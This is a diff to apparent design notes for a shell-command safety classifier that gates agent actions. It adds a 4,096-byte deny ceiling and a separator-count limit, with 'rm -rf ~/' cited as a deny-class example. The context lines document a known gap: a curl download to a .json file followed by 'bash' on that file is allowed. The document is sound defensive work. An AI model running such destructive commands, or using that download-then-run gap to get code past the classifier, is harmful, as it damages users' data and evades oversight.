@@ -134,6 +134,18 @@ Do not claim that a herdr launch floor governs those descendants.
 PR #94 settled two limits that look like bugs, are not being fixed, and should
 not be "fixed" by a later reader without reading this first.
 
+**Input-complexity safety ceiling.** Before any text scanner runs, original
+command/panel text over 4,096 bytes is `deny`; text over 1,024 bytes with more
+than 128 shell separators (`;`, `&`, `|`, or newline) is also `deny`. Byte
+counting temporarily uses `LC_ALL=C` and restores the caller's exact locale
+state. The ceiling is deliberately a deny floor, not `escalate`: padding must
+never turn `rm -rf ~/` or another deny-class command into something a
+conductor can approve. Menu surfaces expose the same reason as human-reserved,
+and `peer_decide` applies it before manifests, ownership grants, or other
+scans. Split long interactive commands. Code-by-reference remains the route
+for legitimate long scripts: content over the ceiling cannot clear
+automatically and requires review bound to that file's sha256.
+
 **A landed file with a data extension is exempt, and running it later is
 allowed.** `curl -sS <url> -o /tmp/payload.json` classifies `allow`, and the
 separate command `bash /tmp/payload.json` classifies `allow` too — the
